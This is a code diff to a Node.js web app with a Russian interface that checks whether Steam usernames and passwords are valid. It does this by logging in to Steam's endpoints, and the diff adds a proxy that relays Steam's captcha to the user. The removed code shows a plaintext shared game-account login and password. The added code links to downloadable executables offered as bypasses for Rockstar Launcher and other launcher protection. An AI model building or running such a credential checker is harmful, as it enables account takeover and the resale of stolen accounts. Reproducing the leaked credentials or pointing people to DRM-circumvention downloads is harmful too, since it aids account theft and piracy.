@@ -34,7 +34,6 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             --ok: #00ff9d;
             --err: #ff3366;
             --warn: #ffb800;
-            --tg: #2AABEE;
         }
         * { box-sizing: border-box; }
         body {
@@ -50,7 +49,7 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             justify-content: center;
             align-items: flex-start;
             min-height: 100vh;
-            padding: 32px 20px;
+            padding: 40px 20px;
         }
         .container {
             background: var(--surface);
@@ -106,14 +105,15 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
         }
         .nav-tab {
             flex: 1;
-            padding: 12px 8px;
+            padding: 12px;
             text-align: center;
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             font-weight: 600;
             color: var(--text-muted);
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
+            letter-spacing: 0.5px;
         }
         .nav-tab.active {
             background: rgba(0, 212, 255, 0.08);
@@ -216,7 +216,8 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             border-radius: 10px;
             font-size: 0.85rem;
             font-weight: 700;
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
             text-align: center;
             display: none;
             animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
@@ -238,92 +239,59 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             background: rgba(255, 184, 0, 0.05);
             border: 1px solid rgba(255, 184, 0, 0.2);
             color: var(--warn);
+            text-transform: none;
+            letter-spacing: 0.5px;
+            font-weight: 500;
         }
 
-        .account-card {
+        .captcha-box {
+            margin-top: 1.5rem;
+            padding: 1.5rem;
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid var(--border);
             border-radius: 12px;
-            padding: 20px;
-            text-align: left;
-            transition: all 0.3s ease;
-        }
-        .account-card:hover {
-            border-color: var(--accent);
-            box-shadow: 0 0 20px rgba(0, 212, 255, 0.1);
-        }
-        .account-game {
-            font-size: 1.1rem;
-            font-weight: 700;
-            color: var(--accent);
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .account-creds {
-            font-size: 0.9rem;
-            color: var(--text-muted);
-            margin-bottom: 16px;
-            font-family: 'SF Mono', Consolas, monospace;
-            line-height: 1.6;
-        }
-        .account-creds code {
-            color: var(--text);
-            background: rgba(255,255,255,0.05);
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
-        .account-result {
-            margin-top: 12px;
-            padding: 10px;
-            border-radius: 8px;
-            font-weight: 700;
-            text-align: center;
             display: none;
-            animation: popIn 0.3s ease;
-            font-size: 0.85rem;
-            letter-spacing: 0.5px;
+            animation: fadeIn 0.4s ease;
         }
-        .account-result.success {
-            background: rgba(0, 255, 157, 0.1);
-            color: var(--ok);
-            border: 1px solid rgba(0, 255, 157, 0.3);
-        }
-        .account-result.error {
-            background: rgba(255, 51, 102, 0.1);
-            color: var(--err);
-            border: 1px solid rgba(255, 51, 102, 0.3);
+        .captcha-box.show { display: block; }
+        .captcha-box img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            background: #fff;
         }
 
-        .divider {
-            height: 1px;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
-            margin: 2rem 0 1.5rem 0;
+        .bypass-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
         }
-        .tg {
+        .bypass-btn {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
-            width: 100%;
-            padding: 14px;
-            background: transparent;
-            border: 1px solid rgba(42, 171, 238, 0.25);
+            gap: 14px;
+            padding: 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border);
             border-radius: 12px;
-            color: var(--tg);
+            color: var(--text);
             text-decoration: none;
-            font-size: 0.85rem;
-            font-weight: 700;
-            letter-spacing: 2px;
-            text-transform: uppercase;
+            font-weight: 600;
+            font-size: 0.95rem;
             transition: all 0.3s ease;
         }
-        .tg:hover {
-            border-color: rgba(42, 171, 238, 0.5);
-            box-shadow: 0 0 24px rgba(42, 171, 238, 0.15);
-            background: rgba(42, 171, 238, 0.03);
+        .bypass-btn:hover {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.05);
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.1);
+            transform: translateY(-2px);
         }
-        .tg svg { width: 16px; height: 16px; fill: currentColor; }
+        .bypass-btn svg {
+            width: 20px;
+            height: 20px;
+            color: var(--accent);
+            flex-shrink: 0;
+        }
 
         @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@@ -339,9 +307,10 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
 
         <div class="nav-tabs">
             <div class="nav-tab active" data-view="checker">Проверка</div>
-            <div class="nav-tab" data-view="accounts">Общие аккаунты</div>
+            <div class="nav-tab" data-view="bypass">Обходы лаунчеров</div>
         </div>
 
+        <!-- CHECKER VIEW -->
         <div id="checkerView" class="view-section active">
             <div class="section-header">
                 <h2>Auth Check</h2>
@@ -356,34 +325,45 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
                 <input type="password" id="password" placeholder="••••••••">
             </div>
             <button class="btn" id="checkBtn">Проверить</button>
+            
+            <div class="captcha-box" id="captchaBox">
+                <img id="captchaImage" alt="CAPTCHA">
+                <div class="field" style="margin-bottom: 10px">
+                    <input type="text" id="captchaText" placeholder="Введите код с картинки">
+                </div>
+                <button class="btn" id="captchaBtn" style="border-color: rgba(255, 184, 0, 0.3); color: var(--warn);">Отправить</button>
+            </div>
+
             <div class="result" id="result"></div>
         </div>
 
-        <div id="accountsView" class="view-section">
+        <!-- BYPASS VIEW -->
+        <div id="bypassView" class="view-section">
             <div class="section-header">
-                <h2>Общие аккаунты</h2>
-                <p>Нажми на кнопку, чтобы скопировать данные и начать проверку</p>
+                <h2>Обходы лаунчеров</h2>
+                <p>Выберите необходимый инструмент для обхода защиты</p>
             </div>
-            <div class="account-card">
-                <div class="account-game">Cyberpunk 2077</div>
-                <div class="account-creds">
-                    <div>Логин: <code>msk247542</code></div>
-                    <div>Пароль: <code>rae246924</code></div>
-                </div>
-                <button class="btn" onclick="copyAndCheck('msk247542', 'rae246924', this)">
-                    Скопировать и проверить
-                </button>
-                <div class="account-result" id="accountResult"></div>
+            <div class="bypass-list">
+                <a href="https://github.com/onajlikezz/Nightlight-Launcher/releases/download/NLLauncherV5.3.00/Nightlight.Launcher.Setup.5.3.0.exe" class="bypass-btn" target="_blank">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                        <polyline points="7 10 12 15 17 10"></polyline>
+                        <line x1="12" y1="15" x2="12" y2="3"></line>
+                    </svg>
+                    <span>Обход Rockstar Launcher</span>
+                </a>
+                <a href="https://github.com/LightnigFast/Project-Lightning/releases/download/v5.0.11.0/ProjectLightningInstaller-v5.exe" class="bypass-btn" target="_blank">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+                    </svg>
+                    <span>Универсальный обход</span>
+                </a>
             </div>
-            <div class="divider"></div>
-            <a href="https://t.me/MirArenDaff" target="_blank" class="tg">
-                <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.141.119.098.152.228.166.319.016.101.017.204.011.285z"/></svg>
-                Подпишись
-            </a>
         </div>
     </div>
 
     <script>
+        // Tab switching
         document.querySelectorAll('.nav-tab').forEach(tab => {
             tab.addEventListener('click', () => {
                 document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
@@ -393,44 +373,7 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             });
         });
 
-        async function copyAndCheck(login, password, btn) {
-            try {
-                await navigator.clipboard.writeText(login + ':' + password);
-            } catch (err) {
-                console.error('Failed to copy', err);
-            }
-
-            const resDiv = document.getElementById('accountResult');
-            btn.disabled = true;
-            btn.textContent = 'Проверка...';
-            resDiv.style.display = 'none';
-
-            try {
-                const response = await fetch('/check', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: login, password: password, captcha_gid: '-1', captcha_text: '' })
-                });
-                const data = await response.json();
-
-                resDiv.style.display = 'block';
-                if (data.status === 'success') {
-                    resDiv.className = 'account-result success';
-                    resDiv.textContent = 'Аккаунт работает! ' + (data.message.includes('Guard') ? '(Steam Guard)' : '');
-                } else {
-                    resDiv.className = 'account-result error';
-                    resDiv.textContent = 'Аккаунт не работает';
-                }
-            } catch (error) {
-                resDiv.style.display = 'block';
-                resDiv.className = 'account-result error';
-                resDiv.textContent = 'Ошибка соединения';
-            } finally {
-                btn.disabled = false;
-                btn.textContent = 'Скопировать и проверить';
-            }
-        }
-
+        let captchaGid = '-1';
         let cooldownTimer = null;
         const COOLDOWN = 15;
 
@@ -461,16 +404,16 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             res.textContent = text;
         }
 
-        async function doCheck(login, pass) {
+        async function doCheck(login, pass, gid, text) {
             try {
                 const r = await fetch('/check', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: login, password: pass, captcha_gid: '-1', captcha_text: '' })
+                    body: JSON.stringify({ username: login, password: pass, captcha_gid: gid, captcha_text: text })
                 });
                 return await r.json();
             } catch (e) {
-                return { status: 'error', message: 'Ошибка сети' };
+                return { status: 'error', message: 'Ошибка соединения' };
             }
         }
 
@@ -479,7 +422,7 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             const p = document.getElementById('password').value.trim();
             
             if (!u || !p) {
-                showResult('err', 'Заполните поля');
+                showResult('err', 'Заполните все поля');
                 return;
             }
             
@@ -487,13 +430,17 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             btn.disabled = true;
             btn.textContent = 'Проверка...';
             document.getElementById('result').classList.remove('show');
+            document.getElementById('captchaBox').classList.remove('show');
             
-            const data = await doCheck(u, p);
+            const data = await doCheck(u, p, '-1', '');
             
-            if (data.status === 'success') {
-                showResult('ok', 'Аккаунт работает' + (data.message.includes('Guard') ? ' (Steam Guard)' : ''));
-            } else if (data.status === 'captcha') {
+            if (data.status === 'captcha') {
+                captchaGid = data.captcha_gid;
+                document.getElementById('captchaImage').src = '/api/captcha/' + captchaGid;
+                document.getElementById('captchaBox').classList.add('show');
                 showResult('warn', 'Требуется капча');
+            } else if (data.status === 'success') {
+                showResult('ok', 'Аккаунт работает');
             } else {
                 showResult('err', 'Аккаунт не работает');
             }
@@ -503,6 +450,41 @@ const HTML_TEMPLATE = `<!DOCTYPE html>
             startCooldown();
         });
 
+        document.getElementById('captchaBtn').addEventListener('click', async () => {
+            const u = document.getElementById('username').value.trim();
+            const p = document.getElementById('password').value.trim();
+            const t = document.getElementById('captchaText').value.trim();
+            
+            if (!t) {
+                showResult('err', 'Введите код капчи');
+                return;
+            }
+            
+            const btn = document.getElementById('captchaBtn');
+            btn.disabled = true;
+            btn.textContent = 'Проверка...';
+            
+            const data = await doCheck(u, p, captchaGid, t);
+            
+            if (data.status === 'captcha') {
+                document.getElementById('captchaImage').src = '/api/captcha/' + data.captcha_gid + '?t=' + Date.now();
+                captchaGid = data.captcha_gid;
+                document.getElementById('captchaText').value = '';
+                showResult('warn', 'Неверная капча, попробуйте снова');
+            } else if (data.status === 'success') {
+                document.getElementById('captchaBox').classList.remove('show');
+                showResult('ok', 'Аккаунт работает');
+            } else {
+                document.getElementById('captchaBox').classList.remove('show');
+                showResult('err', 'Аккаунт не работает');
+            }
+            
+            btn.disabled = false;
+            btn.textContent = 'Отправить';
+            startCooldown();
+        });
+
+        // Background ping for stats (kept for backend compatibility)
         let sid = sessionStorage.getItem('sid');
         if (!sid) {
             sid = Math.random().toString(36).substring(2, 15);
@@ -561,47 +543,26 @@ async function checkSteamCredentials(username, password, captchaGid = '-1', capt
 
     let rsaData, sessionCookies = '';
     try {
-        const rsaResponse = await axios.get('https://steamcommunity.com/login/getrsakey', { 
-            params: { username }, 
-            headers, 
-            timeout: 10000 
-        });
+        const rsaResponse = await axios.get('https://steamcommunity.com/login/getrsakey', { params: { username }, headers, timeout: 10000 });
         rsaData = rsaResponse.data;
         if (rsaResponse.headers['set-cookie']) {
             sessionCookies = rsaResponse.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
         }
-    } catch (error) { 
-        return { status: 'error', message: 'Ошибка сети при проверке' }; 
-    }
+    } catch (error) { return { status: 'error', message: 'Аккаунт не работает' }; }
 
-    if (!rsaData.success) {
-        return { status: 'error', message: 'Аккаунт не работает (неверный логин)' };
-    }
+    if (!rsaData.success) return { status: 'error', message: 'Аккаунт не работает' };
 
     let encryptedPasswordB64;
     try {
         const publicKeyPem = buildRSAPublicKeyPEM(rsaData.publickey_mod, rsaData.publickey_exp);
-        const encrypted = crypto.publicEncrypt(
-            { key: publicKeyPem, padding: crypto.constants.RSA_PKCS1_PADDING }, 
-            Buffer.from(password, 'utf-8')
-        );
+        const encrypted = crypto.publicEncrypt({ key: publicKeyPem, padding: crypto.constants.RSA_PKCS1_PADDING }, Buffer.from(password, 'utf-8'));
         encryptedPasswordB64 = encrypted.toString('base64');
-    } catch (error) { 
-        return { status: 'error', message: 'Ошибка шифрования' }; 
-    }
+    } catch (error) { return { status: 'error', message: 'Аккаунт не работает' }; }
 
     const payload = new URLSearchParams({
-        username,
-        password: encryptedPasswordB64,
-        twofactorcode: '',
-        emailauth: '',
-        loginfriendlyname: '',
-        captchagid: captchaGid,
-        captcha_text: captchaText,
-        emailsteamid: '',
-        rsatimestamp: rsaData.timestamp,
-        remember_login: 'false',
-        donotcache: Date.now().toString()
+        username, password: encryptedPasswordB64, twofactorcode: '', emailauth: '', loginfriendlyname: '',
+        captchagid: captchaGid, captcha_text: captchaText, emailsteamid: '', rsatimestamp: rsaData.timestamp,
+        remember_login: 'false', donotcache: Date.now().toString()
     });
 
     const loginHeaders = { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' };
@@ -609,43 +570,32 @@ async function checkSteamCredentials(username, password, captchaGid = '-1', capt
 
     let loginData;
     try {
-        const loginResponse = await axios.post('https://steamcommunity.com/login/dologin/', payload.toString(), { 
-            headers: loginHeaders, 
-            timeout: 10000 
-        });
+        const loginResponse = await axios.post('https://steamcommunity.com/login/dologin/', payload.toString(), { headers: loginHeaders, timeout: 10000 });
         loginData = loginResponse.data;
-    } catch (error) { 
-        return { status: 'error', message: 'Ошибка сети при входе' }; 
-    }
+    } catch (error) { return { status: 'error', message: 'Аккаунт не работает' }; }
 
-    // ПОЛНОЦЕННАЯ ПРОВЕРКА:
-    if (loginData.success) {
-        return { status: 'success', message: 'Аккаунт работает' };
-    }
-
-    // Если требуется код Steam Guard (мобильный аутентификатор), значит пароль ВЕРНЫЙ!
-    if (loginData.requires_twofactor) {
-        return { status: 'success', message: 'Аккаунт работает (установлен Steam Guard)' };
-    }
-
-    // Если требуется код с почты, значит пароль ВЕРНЫЙ!
-    if (loginData.emailauth_needed) {
-        return { status: 'success', message: 'Аккаунт работает (требуется код с почты)' };
-    }
-
+    if (loginData.success) return { status: 'success', message: 'Аккаунт работает' };
     if (loginData.captcha_needed) {
         return { status: 'captcha', message: 'Требуется капча', captcha_gid: loginData.captcha_gid || '-1' };
     }
-
-    // Если Steam вернул конкретную ошибку (например, "Incorrect password")
-    if (loginData.message) {
-        return { status: 'error', message: `Аккаунт не работает (${loginData.message})` };
-    }
-
     return { status: 'error', message: 'Аккаунт не работает' };
 }
 
 app.get('/', (req, res) => res.send(HTML_TEMPLATE));
+
+app.get('/api/captcha/:gid', async (req, res) => {
+    try {
+        const response = await axios.get(`https://steamcommunity.com/login/rendercaptcha/?gid=${req.params.gid}`, {
+            responseType: 'arraybuffer',
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
+            timeout: 10000
+        });
+        res.set('Content-Type', 'image/jpeg');
+        res.send(response.data);
+    } catch (e) {
+        res.status(500).send('Ошибка загрузки капчи');
+    }
+});
 
 app.post('/ping', (req, res) => {
     if (req.body.sessionId) activeSessions.set(req.body.sessionId, Date.now());
